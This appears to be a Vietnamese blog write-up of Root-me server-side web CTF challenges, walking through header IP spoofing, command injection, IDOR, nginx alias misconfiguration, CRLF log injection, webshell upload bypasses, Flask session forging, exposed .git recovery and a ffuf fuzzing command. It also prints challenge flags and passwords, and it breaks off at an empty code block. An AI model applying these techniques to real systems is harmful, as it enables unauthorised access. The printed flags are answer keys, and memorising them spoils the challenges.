---
title: "Root-me server side - WEB 's challenges"
excerpt: "November 14, 2024 07:00 AM ICT to November 14, 2024 07:00 AM ICT"

header:
show_date: true
header:
  teaser: "../assets/images/images-icon/rootme.png"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/rootme.png" alt="">
</p>


# Root-me server side

## HTML - Source code

![image](https://hackmd.io/_uploads/B1kHlOs1yx.png)

![image](https://hackmd.io/_uploads/SJqHedo1kx.png)

![image](https://hackmd.io/_uploads/Bywvedskye.png)

flag: `nZ^&@q5&sjJHev0`

## HTTP - IP restriction bypass

![image](https://hackmd.io/_uploads/H1dqedjkJe.png)

Nếu người dùng trong mạng nội bộ của công ty thì không cần phải đăng nhập

![image](https://hackmd.io/_uploads/rkbyWdsk1l.png)

Có thể thấy ipv6 của ta ở đây (vậy làm sao để bypass cho hệ thống nghĩ mình nằm trong LAN)

![image](https://hackmd.io/_uploads/Hy3L-di11l.png)

Mình thử với header `X-Forwarded-X: 127.0.0.1` -> server thông báo ip mình là 127.0.0.1 nhưng vẫn chưa cùng side với LAN

Đây là các dải ip thuộc mạng LAN

```
Dải IP 10.0.0.0 đến 10.255.255.255
(Subnet mask: 255.0.0.0)

Dải IP 172.16.0.0 đến 172.31.255.255
(Subnet mask: 255.240.0.0)

Dải IP 192.168.0.0 đến 192.168.255.255
(Subnet mask: 255.255.0.0)
```

Mình đã thử với các giá trị:

```
192.168.1.1
192.168.0.100
10.0.0.5
172.16.0.10
```
Nhưng vẫn không được -> thử chuyển qua ipv6 vì ban đầu server cũng hiển thị ipv6:

```
fc00::/7:

Đây là dải địa chỉ được phân bổ cho mạng riêng.
Các địa chỉ trong khoảng từ fc00:: đến fdff:ffff:ffff:ffff:ffff:ffff:ffff
.
fe80::/10:

Đây là dải địa chỉ cho các liên kết cục bộ (link-local addresses), thường được sử dụng để giao tiếp giữa các thiết bị trong cùng một mạng LAN.
Các địa chỉ trong khoảng từ fe80:: đến febf:ffff:ffff:ffff:ffff:ffff:ffff

```
Mình thử với các giá trị này thì nhận được flag

```
fd00::1
fe80::a00:27ff:fe4e:66d7
fc00::1234:5678:9abc:def0
```

![image](https://hackmd.io/_uploads/ByzxQ_iJ1l.png)

![image](https://hackmd.io/_uploads/rJCeQ_j1kl.png)

flag: `Ip_$po0Fing`

## HTTP - Open redirect

![image](https://hackmd.io/_uploads/rJ8XXuoyyl.png)

![image](https://hackmd.io/_uploads/rkguDQ_sJke.png)

Khi ta click vào 1 trong 3 button thì sẽ redirect đến trang tương ứng

Do bài này đề cập đến việc redirect cho nên mình sẽ chặn proxy để kiểm tra

![image](https://hackmd.io/_uploads/HkX5XuoJkx.png)

Có một đoạn này trước khi thực hiện redirect:

![image](https://hackmd.io/_uploads/BkzKPdoJ1x.png)

có 2 đối số là url và h mình thấy h này khả năng cao là md5 vì nó có 32 bit nhưng crack không thấy gì -> mình đoán h này là của url nên đem vào thử luôn

![image](https://hackmd.io/_uploads/HJGWY_ikJx.png)

Đúng như dự đoán h sẽ là hash md5 của url -> mình thử với 1 url khác -> hash nó

![image](https://hackmd.io/_uploads/H10Qt_syJx.png)

Có thể đoán đoạn hiện flag là flag not in array url, if(h === md5(url){
echo flag;
})

flag: `e6f8a530811d5a479812d7b82fc1a5c5`

## HTTP - User-agent

![image](https://hackmd.io/_uploads/SyYMcdiJyg.png)

với tiêu đề có thể đoán cần phải đổi user-agent header thành admin để hoàn thành chall.

![image](https://hackmd.io/_uploads/rkQU5uiJ1g.png)


flag: `rr$Li9%L34qd1AAe27`

## Weak password

Với tiêu đề có vẻ ta phải brute force password

![image](https://hackmd.io/_uploads/Hkz1TdjJke.png)

sau khi nhập username và pass thì cookie chứa basic auth 

![image](https://hackmd.io/_uploads/Sy_ZT_oykx.png)

![image](https://hackmd.io/_uploads/ryd5-tsJJx.png)

![image](https://hackmd.io/_uploads/SyAs-FjyJe.png)

![image](https://hackmd.io/_uploads/SJa3ZFo11e.png)

flag: `admin`

## PHP - Command injection

Như tiêu đề thì đây là bài command injection

![image](https://hackmd.io/_uploads/r1V7GYsyJe.png)

cần phải đọc file index.php đến hoàn thành bài.

![image](https://hackmd.io/_uploads/BJlDMKs1Jg.png)

khi ta nhập 1 ip vào thì nó sẽ ping đến đó và hiển thị kết quả:

![image](https://hackmd.io/_uploads/H1MFGYs1kx.png)

có để đoán lệnh command là `ping -c $ip`

-> ta sẽ inject vào bằng nhiều cách có vẻ không filter gì

![image](https://hackmd.io/_uploads/r1jnmtik1x.png)

![image](https://hackmd.io/_uploads/HyxRXKjyJl.png)

quan sát file `$flag = "".file_get_contents(".passwd")."";` biến flag được nhận giá trị là nội dung của .passwd

![image](https://hackmd.io/_uploads/SkofEtjJJl.png)

![image](https://hackmd.io/_uploads/S1LBNtiJke.png)

flag: `S3rv1ceP1n9Sup3rS3cure`

## API - Broken Access

![image](https://hackmd.io/_uploads/B1JxrYjyyx.png)

Như tiêu đề ta có thể thấy có swagger thì đây là những hướng dẫn api mà backend thêm vào để khách hàng hay dev front end có thể làm theo để call được api đó.

![image](https://hackmd.io/_uploads/S1ZsSKoy1g.png)


đây là cấu trúc swagger cơ bản có các api, và model để nhận và trả dữ liệu

![image](https://hackmd.io/_uploads/Bk7kLYiyye.png)

ở đây có 2 api chính là tạo tài khoản, login, trả ra thông tin người dùng, và update note

những api này thêm header token để authentication mới có thể access đến các api trả ra thông tin người dùng, và update note.

![image](https://hackmd.io/_uploads/HyGLLFs11x.png)

như dạng trên ta có thể thấy note của họ.


![image](https://hackmd.io/_uploads/BJq7_Kjkkg.png)

tạo một tài khoản admin, nhưng tên này đã tồn tại -> tạo tài khoản user và login

![image](https://hackmd.io/_uploads/HyQUdtoJke.png)

![image](https://hackmd.io/_uploads/rJWudtsJyl.png)

Truy cập api user thì thấy note của mình

![image](https://hackmd.io/_uploads/HJ8etYo1Jx.png)

Quan sát kĩ, mặc định user_id không được điền, vậy nếu ta thay đổi user_id thì sao:

![image](https://hackmd.io/_uploads/BJ3QtFj1yg.png)

thành công nhận flag: 

flag: `RM{E4sy_1d0r_0n_API}`

## Backup file

![image](https://hackmd.io/_uploads/Sy6ttYi1Je.png)

Theo như tên có vẻ chall lộ file back up ở đâu đó

Sau khi recon cơ bản thấy có file backup

![image](https://hackmd.io/_uploads/rJr86Yik1l.png)

![image](https://hackmd.io/_uploads/BJAFpYok1x.png)

username là `ch11` pass `OCCY9AcNm1tj`

![image](https://hackmd.io/_uploads/SyN6atjJkx.png)

flag: `OCCY9AcNm1tj`

## HTTP - Directory indexing

![image](https://hackmd.io/_uploads/B15bAFsJ1g.png)

Thấy có hint ctrl+u view source

![image](https://hackmd.io/_uploads/rJ_ERtoy1e.png)

![image](https://hackmd.io/_uploads/HyI9RFokJg.png)

vào như trong thì bị rick roll nên mình không vào :+1: 

![image](https://hackmd.io/_uploads/Hyo3RKiyye.png)

flag: `LINUX`

## HTTP - Headers

des: `Get an administrator access to the webpage.`

Cần phải là admin mới access được page

![image](https://hackmd.io/_uploads/BJqmk9sJ1e.png)

`Content is not the only part of an HTTP response!`

Có vẻ liên quan để phần header phản hồi http

![image](https://hackmd.io/_uploads/rJKnkqsykx.png)

để ý `Header-RootMe-Admin: none` là none có vẻ như nếu thành true hoặc có thì sẽ nhận được flag

![image](https://hackmd.io/_uploads/H1Ayx9iJyl.png)


flag: `HeadersMayBeUseful`

## HTTP - POST

![image](https://hackmd.io/_uploads/S1Z8gcikJx.png)

![image](https://hackmd.io/_uploads/SyxKgqjkkl.png)

Không có gì để nói:

![image](https://hackmd.io/_uploads/Hykol5ikJl.png)

flag: `H7tp_h4s_N0_s3Cr37S_F0r_y0U`

## HTTP - Improper redirect

des: `Get access to index. + Don’t trust your browser`

![image](https://hackmd.io/_uploads/S1ux-5i1Jx.png)

![image](https://hackmd.io/_uploads/S1B2W9iy1x.png)

Lúc mình login đến nó thì location đưa mình trở lại login nếu không đăng nhập được -> nhưng ở đây dính lỗ hổng `Execution After Redirect` 

https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)

có nghĩa là trang này sẽ được excute trước khi redirect được diễn ra và hiển thị nội dung flag.

flag: `ExecutionAfterRedirectIsBad`

## HTTP - Verb tampering

des: `Bypass the security establishment.`

vượt qua bảo mật được tạo ra:

Dùng cách như với các chall trên không được -> đổi method thì nhận flag:

![image](https://hackmd.io/_uploads/r14fw9jJyx.png)

flag: `a23e$dme96d3saez$$prap`


## Install files

![image](https://hackmd.io/_uploads/HkAVvcok1x.png)

![image](https://hackmd.io/_uploads/B1-wwqjykx.png)

Vẫn không có gì

![image](https://hackmd.io/_uploads/BySjD9i1Jx.png)

http://francois.muller.free.fr/diversifier/phpBB2/docs/INSTALL.html ở đây ta thấy server sử dụng phpBB

`Là một phần mềm miễn phí và cung cấp các tính năng hữu ích có sẵn, đây là công cụ xây dựng diễn đàn phổ biến nhất hiện nay. Cái tên phpBB là từ viết tắt của cụm PHP Bulletin Board.`

![image](https://hackmd.io/_uploads/rJSvYci1kl.png)

có thể thấy ta có thể truy cập vào install

![image](https://hackmd.io/_uploads/BJ6ttqoJkl.png)

ở đây có file install.php chưa xóa ->

![image](https://hackmd.io/_uploads/SkmiKqjJke.png)

flag: `karambar`

## Nginx - Alias Misconfiguration

![image](https://hackmd.io/_uploads/SylOb55jk1x.png)

ta thấy có hint `Off By Slash`

![image](https://hackmd.io/_uploads/Bk8Wp5iJkl.png)

form không có tác dụng gì -> xem mã html

![image](https://hackmd.io/_uploads/r1dmT5oJyx.png)

![image](https://hackmd.io/_uploads/SkJSTciykx.png)

Nhưng cũng không có file gì

dựa tên đề bài tìm các lỗi phổ biến do cấu hình:

https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/

Ta thấy có lỗi `Off-By-Slash` như trong hint 

```
server {
        listen 80 default_server;

        server_name _;

        location /static {
                alias /usr/share/nginx/static/;
        }
        
        location /api {
                proxy_pass http://apiserver/v1/;
        }
}
```

Cấu hình sai sẽ như thế này chúng ta có thể đi qua một bước trên đường dẫn do thiếu dấu gạch chéo

https://viblo.asia/p/cac-cau-hinh-sai-nginx-pho-bien-khien-web-server-cua-ban-gap-nguy-hiem-part-1-6J3ZgNxLKmB

![image](https://hackmd.io/_uploads/ByKdA5jy1x.png)

![image](https://hackmd.io/_uploads/rkDKCqsJye.png)

flag: `RM{4lias_M1sC0nf_HuRtS!}`

## Nginx - Root Location Misconfiguration

bài này chỉ dành cho premium user 

Ta có thể đọc trong này để biết cách khai thác

https://viblo.asia/p/cac-cau-hinh-sai-nginx-pho-bien-khien-web-server-cua-ban-gap-nguy-hiem-part-1-6J3ZgNxLKmB

## API - Mass Assignment

Des:
![image](https://hackmd.io/_uploads/ByirBjnkJx.png)

Bài này gần giống bài swagger ở trên nên mình sẽ không nhắc lại các chức năng giống nữa.
Điểm khác ở bài này là phần api/user không có user_id ở phần cuối nữa

![image](https://hackmd.io/_uploads/B1VLOi3k1l.png)

Phần data trả ra:

```
{
  "id": 0,
  "username": "string",
  "note": "string",
  "status": "string"
}
```

![image](https://hackmd.io/_uploads/ryUiuih11e.png)

Ta thấy phải có status là admin thì chắc mới có thể access đến flag

![image](https://hackmd.io/_uploads/Hy2Ausnkyx.png)

Phần api/note dùng để cập nhật note của người dùng

![image](https://hackmd.io/_uploads/HJPHFs211x.png)

Mình thử test nó thì không thấy update cả status

access đến api/flag:

![image](https://hackmd.io/_uploads/BJgdFo31yg.png)

ta vẫn không thể retrive ra thông tin của flag

![image](https://hackmd.io/_uploads/rkZsFih1yx.png)

có vẻ như dev đã che dấu api gì đó liên quan đến user vì nếu không gắn anotation tại swagger

![image](https://hackmd.io/_uploads/SJHkhj2kJx.png)

Mình thử thay đổi endpoint thành /api/user thì update được user

truy cập thì thấy status đã chuyển thành admin

![image](https://hackmd.io/_uploads/rklpu2211x.png)

![image](https://hackmd.io/_uploads/By4Aun3kkl.png)

flag: `RM{4lw4yS_ch3ck_0pt10ns_m3th0d}`

## CRLF

![image](https://hackmd.io/_uploads/B1GjXZak1g.png)

![image](https://hackmd.io/_uploads/Hke9EZT1ye.png)

```
admin failed to authenticate.
admin authenticated.
guest failed to authenticate.
\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0 failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin
 failed to authenticate.
admin authenticated
 failed to authenticate.
admin authenticated.
 failed to authenticate.
admin authenticated.
lmao failed to authenticate.
```

theo như trong ảnh ta có thể thấy là server sẽ lấy username là admin nếu passwd đúng thì sẽ gọi tên+authenticated., nếu sai thì ngược lại -> có vẽ như mình có thể lợi dụng crlf để để tên là admin authenticated. sau đó xuống dòng để tên user khác thì sẽ được.

flag: `rFSP&G0p&5uAg1%`

## File upload - Double extensions

![image](https://hackmd.io/_uploads/Byfcr-61Jl.png)

yêu cầu là upload được web shell và đọc được nội dung của file .passwd

Hint nằm trong tên chall là double extensions.

![image](https://hackmd.io/_uploads/HJmmUZpJyl.png)

![image](https://hackmd.io/_uploads/rywt8bTkJg.png)

ta thấy chỉ cho phép sử dụng file ảnh:

![image](https://hackmd.io/_uploads/HJWnI-aJ1x.png)

![image](https://hackmd.io/_uploads/HJgTU-p1kl.png)

![image](https://hackmd.io/_uploads/Bk-1D-T1kl.png)
 
 có thể thấy đã upload shell thành công vì system đã cảnh bảo chưa có biến
 
![image](https://hackmd.io/_uploads/rJp8F-aJyl.png)

![image](https://hackmd.io/_uploads/S1AdKZ6kJg.png)

flag: `Gg9LRz-hWSxqqUKd77-_q-6G8`

## File upload - MIME type

![image](https://hackmd.io/_uploads/r1RhKbp1yl.png)

khá giống bài trên nhưng bài này liên quan đến mime type

![image](https://hackmd.io/_uploads/B1ox5bpJ1e.png)

![image](https://hackmd.io/_uploads/Hym89ZaJkx.png)

![image](https://hackmd.io/_uploads/S1M59bTJkl.png)

thành công up file:

![image](https://hackmd.io/_uploads/B1o0q-p1Jl.png)

flag: `a7n4nizpgQgnPERy89uanf6T4`

## Flask - Unsecure session

![image](https://hackmd.io/_uploads/S1E-s-p11g.png)

hint bài này nằm trong des nói là key yếu -> vậy ta thử brute key

![image](https://hackmd.io/_uploads/rJAknZakyx.png)
 một trang khá hoành tráng
 
 ![image](https://hackmd.io/_uploads/rydbhbT1Jl.png)

![image](https://hackmd.io/_uploads/rkIQnW6Jye.png)
 
 dùng flask-session của flask
 
 ![image](https://hackmd.io/_uploads/Hyjwh-TJyx.png)

secret: `s3cr3t`

sign session mới:

![image](https://hackmd.io/_uploads/B1Cphb6ykg.png)

![image](https://hackmd.io/_uploads/S1Q1TZa1yg.png)

flag: `Fl4sK_mi5c0nfigur4ti0n`

## GraphQL - Introspection
Bài này đơn giản chỉ là giúp ta hiểu cơ bản về grapql thôi về các query schema và mutation.

![image](https://hackmd.io/_uploads/rJc1zWay1x.png)

Giao diện như thế này -> và khi chọn option sẽ hiển thị thông tin

![image](https://hackmd.io/_uploads/H1D-GWp1kl.png)

Do đó ta sẽ xem tất cả các thông tin của grapql này:

```
{
    __schema {
        types {
            name, fields {
                name, args {
                    name, description, type {
                        name, kind, ofType {
                            name, kind
                        }
                    }
                }
            }
        }
    }
}
```

![image](https://hackmd.io/_uploads/rygSzWpJyg.png)

có thể thấy ở đây có 2 schema

![image](https://hackmd.io/_uploads/rJGIG-akkg.png)

cùng với đó là 2 query:

![image](https://hackmd.io/_uploads/rJSwMWp11l.png)

query đầu tiên thì như mặc định ta thấy ở trên, query 2 có tên là `IAmNotHere` và arg truyền vào là `very_long_id` có kiểu là Int lúc này mình nghĩ là id sẽ chạy từ đâu đến đâu để lấy dữ liệu - ban đầu thấy mỗi id có một kí tự do đó ý tưởng là cộng chuỗi, khi cộng đến 14 thì được chuỗi `nothingherelol` và bị troll -> mình quyết định dumb với id lớn hơn thì được flag.

![image](https://hackmd.io/_uploads/SJdKZbp1ye.png)

flag: `RM{1ntr0sp3ct1On_1s_us3ful}`

## HTTP - Cookies

![image](https://hackmd.io/_uploads/SkME6Waykx.png)

![image](https://hackmd.io/_uploads/rJ0JyGpkJx.png)

![image](https://hackmd.io/_uploads/S1YaC-p1kg.png)

flag: `ml-SYMPA`

## Insecure Code Management

![image](https://hackmd.io/_uploads/BJRXyzaJ1l.png)

Mình thử scan thử xem sao thì phát hiện thư mục .git chưa được gỡ bỏ.

![image](https://hackmd.io/_uploads/SJVyZfpy1e.png)

ở đây mình dùng `scrabble` để lấy hết tất cả các file xuống 

![image](https://hackmd.io/_uploads/HJN7bG6k1e.png)

ở đây mình thấy file config nhưng khả năng cao là không thể crak passwd được gì hash sha256

![image](https://hackmd.io/_uploads/BksBWGT1yl.png)

ở đây mình sẽ tập trung đến file .git

```
l3mnt2010@ASUSEXPERTBOOK:~/rootme/scrabble$ git show 5e0e146e2242cb3e4b836184b688a4e8c0e2cc32
commit 5e0e146e2242cb3e4b836184b688a4e8c0e2cc32
Author: John <john@bs-corp.com>
Date:   Thu Sep 5 11:10:15 2019 +0200

    Initial commit for the new HR database access

diff --git a/config.php b/config.php
new file mode 100644
index 0000000..9a7f16d
--- /dev/null
+++ b/config.php
@@ -0,0 +1,3 @@
+<?php
+       $username = "admin";
+       $password = "admin";
diff --git a/css/style.css b/css/style.css
new file mode 100755
index 0000000..88ccb15
--- /dev/null
+++ b/css/style.css
@@ -0,0 +1,121 @@
+/*
+
+       Author: Martijn Otter
+       Website: http://martijnotter.nl/
+       Email: martijn@otterweb.nl
+
+*/
+
+body {
+       background: url(../image/background.jpg) fixed 50% no-repeat white;
+       font-family: Arial;
+}
+
+h2 {
+       color: #a6a6a6;
+}
+
+/* NAVIGATION */
+
+nav {
+       position: fixed;
+       top: 10px;
+       left: 10px;
+}
+
+nav a {
+       color: #4889C2;
+       font-weight: bold;
+       text-decoration: none;
+       opacity: .3;
+       -moz-transition: all .4s;
...skipping...
commit 5e0e146e2242cb3e4b836184b688a4e8c0e2cc32
Author: John <john@bs-corp.com>
Date:   Thu Sep 5 11:10:15 2019 +0200

    Initial commit for the new HR database access

diff --git a/config.php b/config.php
new file mode 100644
index 0000000..9a7f16d
--- /dev/null
+++ b/config.php
@@ -0,0 +1,3 @@
+<?php
+       $username = "admin";
+       $password = "admin";
diff --git a/css/style.css b/css/style.css
new file mode 100755
index 0000000..88ccb15
--- /dev/null
+++ b/css/style.css
@@ -0,0 +1,121 @@
+/*
+
+       Author: Martijn Otter
+       Website: http://martijnotter.nl/
+       Email: martijn@otterweb.nl
+
+*/
+
+body {
+       background: url(../image/background.jpg) fixed 50% no-repeat white;
+       font-family: Arial;
+}
+
+h2 {
+       color: #a6a6a6;
+}
+
+/* NAVIGATION */
+
+nav {
+       position: fixed;
+       top: 10px;
+       left: 10px;
+}
+
+nav a {
+       color: #4889C2;
+       font-weight: bold;
+       text-decoration: none;
+       opacity: .3;
+       -moz-transition: all .4s;
+}
+
+nav a:hover {
+       opacity: 1;
+}
+
+nav a.focus {
+       opacity: 1;
+}
+
+/* LOGIN & REGISTER FORM */
+
+form {
+       width: 280px;
+       margin: 150px auto;
+       padding-bottom: 20px;
+       background: white;
+       border-radius: 3px;
+       box-shadow: 0 0 10px rgba(0,0,0, .4);
+       text-align: center;
+       padding-top: 30px;
+}
+
+form .text-field {                                                                                                                                                     /* Input fields; Username, Password etc. */
+       border: 1px solid #a6a6a6;
+       width: 230px;
+       height: 40px;
+       border-radius: 3px;
+       margin-top: 10px;
+       padding-left: 10px;
+       color: #6c6c6c;
+       background: #fcfcfc;
+       outline: none;
+       font-size: 16px;
+}
+
+form .text-field:focus {
+       box-shadow: inset 0 0 2px rgba(0,0,0, .3);
+       color: #a6a6a6;
+       background: white;
+}
+
+form .button {                                                                                                                                                         /* Submit button */
+       border-radius: 3px;
+       border: 1px solid #336895;
+       box-shadow: inset 0 1px 0 #8dc2f0;
+       width: 242px;
+       height: 40px;
+       margin-top: 20px;
+
+       background: linear-gradient(bottom, #4889C2 0%, #5BA7E9 100%);
+       background: -o-linear-gradient(bottom, #4889C2 0%, #5BA7E9 100%);
+       background: -moz-linear-gradient(bottom, #4889C2 0%, #5BA7E9 100%);
+       background: -webkit-linear-gradient(bottom, #4889C2 0%, #5BA7E9 100%);
+       background: -ms-linear-gradient(bottom, #4889C2 0%, #5BA7E9 100%);
+
+       cursor: pointer;
+       color: white;
+       font-weight: bold;
+       text-shadow: 0 -1px 0 #336895;
+
+       font-size: 16px;
+}
+
+form .button:hover {
+       background: linear-gradient(bottom, #5c96c9 0%, #6bafea 100%);
+       background: -o-linear-gradient(bottom, #5c96c9 0%, #6bafea 100%);
+       background: -moz-linear-gradient(bottom, #5c96c9 0%, #6bafea 100%);
+       background: -webkit-linear-gradient(bottom, #5c96c9 0%, #6bafea 100%);
+       background: -ms-linear-gradient(bottom, #5c96c9 0%, #6bafea 100%);
+}
+
+form .button:active {
+       background: linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -o-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -moz-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -webkit-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -ms-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+
+       box-shadow: inset 0 0 2px rgba(0,0,0, .3), 0 1px 0 white;
+}
+
+#logo {
+       width: 50%;
+       height: 50%;
+}
+#left {
+       text-align: left;
+       margin-left: 20px;
+}
diff --git a/image/background.jpg b/image/background.jpg
new file mode 100755
index 0000000..0fe805a
Binary files /dev/null and b/image/background.jpg differ
diff --git a/image/logo.png b/image/logo.png
new file mode 100755
index 0000000..0f9caab
Binary files /dev/null and b/image/logo.png differ
diff --git a/index.php b/index.php
new file mode 100755
index 0000000..ee5bbd0
--- /dev/null
+++ b/index.php
@@ -0,0 +1,36 @@
+<!doctype html>
+<html>
+<head>
+       <meta charset="UTF-8">
+       <title>Coffee Database</title>
+       <link rel="stylesheet" href="css/style.css" />
+</head>
+
+<body>
+       <form action='' method="POST">
+               <img src='./image/logo.png' id='logo'>
+               <h2>Coffee Database</h2>
+               <?php
+                       include('./config.php');
+                       if(isset($_POST['username']) && isset($_POST['password'])){
+                               if ($_POST['username'] == $username && $_POST['password'] == $password){
+                                       echo "<p id='left'>Welcome  ".htmlentities($_POST['username'])."</p>";
+                                       echo '<input type="submit" value="LOG IN" href="./index.php" class="button" />';
+                               }
+                               else{
+                                       echo "Unknown user or password";
+                                       echo "<input type='submit' class='button' value='Back' />";
+                               }
+                       }
+                       else{
+                               ?>
+                               <input type="text" name="username" class="text-field" placeholder="Username" />
+                       <input type="password" name="password" class="text-field" placeholder="Password" />
+                               <input type="submit" value="LOG IN" class="button" />
+                               <?php
+                       }
+               ?>
+
+       </form>
+</body>
+</html>
(END)
+       background: -o-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -moz-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -webkit-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -ms-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+
+       box-shadow: inset 0 0 2px rgba(0,0,0, .3), 0 1px 0 white;
+}
+
+#logo {
+       width: 50%;
+       height: 50%;
+}
+#left {
+       text-align: left;
+       margin-left: 20px;
+}
diff --git a/image/background.jpg b/image/background.jpg
new file mode 100755
index 0000000..0fe805a
Binary files /dev/null and b/image/background.jpg differ
diff --git a/image/logo.png b/image/logo.png
new file mode 100755
index 0000000..0f9caab
Binary files /dev/null and b/image/logo.png differ
diff --git a/index.php b/index.php
new file mode 100755
index 0000000..ee5bbd0
--- /dev/null
+++ b/index.php
@@ -0,0 +1,36 @@
+<!doctype html>
+<html>
+<head>
+       <meta charset="UTF-8">
+       <title>Coffee Database</title>
+       <link rel="stylesheet" href="css/style.css" />
+</head>
+
+<body>
+       <form action='' method="POST">
+               <img src='./image/logo.png' id='logo'>
+               <h2>Coffee Database</h2>
+               <?php
+                       include('./config.php');
+                       if(isset($_POST['username']) && isset($_POST['password'])){
+                               if ($_POST['username'] == $username && $_POST['password'] == $password){
+                                       echo "<p id='left'>Welcome  ".htmlentities($_POST['username'])."</p>";
+                                       echo '<input type="submit" value="LOG IN" href="./index.php" class="button" />';
+                               }
+                               else{
+                                       echo "Unknown user or password";
+                                       echo "<input type='submit' class='button' value='Back' />";
+                               }
+                       }
+                       else{
+                               ?>
+                               <input type="text" name="username" class="text-field" placeholder="Username" />
+                       <input type="password" name="password" class="text-field" placeholder="Password" />
+                               <input type="submit" value="LOG IN" class="button" />
+                               <?php
+                       }
+               ?>
+
+       </form>
+</body>
+</html>
(END)
+       background: -o-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -moz-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -webkit-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -ms-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+
+       box-shadow: inset 0 0 2px rgba(0,0,0, .3), 0 1px 0 white;
+}
+
+#logo {
+       width: 50%;
+       height: 50%;
+}
+#left {
+       text-align: left;
+       margin-left: 20px;
+}
diff --git a/image/background.jpg b/image/background.jpg
new file mode 100755
index 0000000..0fe805a
Binary files /dev/null and b/image/background.jpg differ
diff --git a/image/logo.png b/image/logo.png
new file mode 100755
index 0000000..0f9caab
Binary files /dev/null and b/image/logo.png differ
diff --git a/index.php b/index.php
new file mode 100755
index 0000000..ee5bbd0
--- /dev/null
+++ b/index.php
@@ -0,0 +1,36 @@
+<!doctype html>
+<html>
+<head>
+       <meta charset="UTF-8">
+       <title>Coffee Database</title>
+       <link rel="stylesheet" href="css/style.css" />
+</head>
+
+<body>
+       <form action='' method="POST">
+               <img src='./image/logo.png' id='logo'>
+               <h2>Coffee Database</h2>
+               <?php
+                       include('./config.php');
+                       if(isset($_POST['username']) && isset($_POST['password'])){
+                               if ($_POST['username'] == $username && $_POST['password'] == $password){
+                                       echo "<p id='left'>Welcome  ".htmlentities($_POST['username'])."</p>";
+                                       echo '<input type="submit" value="LOG IN" href="./index.php" class="button" />';
+                               }
+                               else{
+                                       echo "Unknown user or password";
+                                       echo "<input type='submit' class='button' value='Back' />";
+                               }
+                       }
+                       else{
+                               ?>
+                               <input type="text" name="username" class="text-field" placeholder="Username" />
+                       <input type="password" name="password" class="text-field" placeholder="Password" />
+                               <input type="submit" value="LOG IN" class="button" />
+                               <?php
+                       }
+               ?>
+
+       </form>
+</body>
+</html>
(END)
```

![image](https://hackmd.io/_uploads/r1-IzfaJkg.png)

![image](https://hackmd.io/_uploads/BkepvzMTJJe.png)

password: `s3cureP@ssw0rd`


## JWT - Introduction

bài này có vẻ tác giả muốn ta làm quen với jwt

![image](https://hackmd.io/_uploads/BJGvVf611e.png)

![image](https://hackmd.io/_uploads/r1gOEzTJJl.png)

flag: `S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7`


## XSS - Server Side

![image](https://hackmd.io/_uploads/H1YSSGTJkl.png)

bài này searching trên hacktrick thì có 1 đống xss server side dynamic pdf cũng tương tự chall này 

đầu tiên tạo tài khoản

![image](https://hackmd.io/_uploads/B1ApYM6yJe.png)

sau đó đăng nhập 

![image](https://hackmd.io/_uploads/HJ9CYfpkye.png)

có form sau khi đăng nhập người dùng sẽ thấy với nó

![image](https://hackmd.io/_uploads/SJJl9zaJkg.png)

có thể thấy giá trị kia bị filter hết nhưng để ý 2 giá trị `lastname` và `lastname` cũng nằm trong này -> thử tạo tk với nó

![image](https://hackmd.io/_uploads/Bke4czTy1e.png)

và gen pdf thì nhận flag

![image](https://hackmd.io/_uploads/B1atKMaJkl.png)

flag: `s3rv3r_s1d3_xss_1s_w4y_m0r3_fun`

## Directory traversal

như tiêu đề:

![image](https://hackmd.io/_uploads/Hy2ECfa1yg.png)

![image](https://hackmd.io/_uploads/H1Pyy761Jg.png)

ta sẽ ffuf thư mục ẩn với wordlist

```
l3mnt2010@ASUSEXPERTBOOK:~/rootme$ ffuf -u http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=FUZZ -w directory-list-2.3-small.txt -mc 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=FUZZ
 :: Wordlist         : FUZZ: directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________
```
![image](https://hackmd.io/_uploads/SkUJCQ61kl.png)

![image](https://hackmd.io/_uploads/HJXgCm6Jke.png)

flag: `kcb$!Bx@v4Gs9Ez`


## File upload - Null byte

như tên thì có vẻ ta upload bypass với null byte trong php nhỏ hơn version 5

![image](https://hackmd.io/_uploads/B1k9Ema1ye.png)

![image](https://hackmd.io/_uploads/HkJyLQaykl.png)

ta sẽ bypass cả mime type + null byte

![image](https://hackmd.io/_uploads/HJWb8Xak1l.png)

flag: `YPNchi2NmTwygr2dgCCF`

## JWT - Revoked token

![image](https://hackmd.io/_uploads/ryK5IXaJkx.png)

để bài cho 2 api và source code 

```
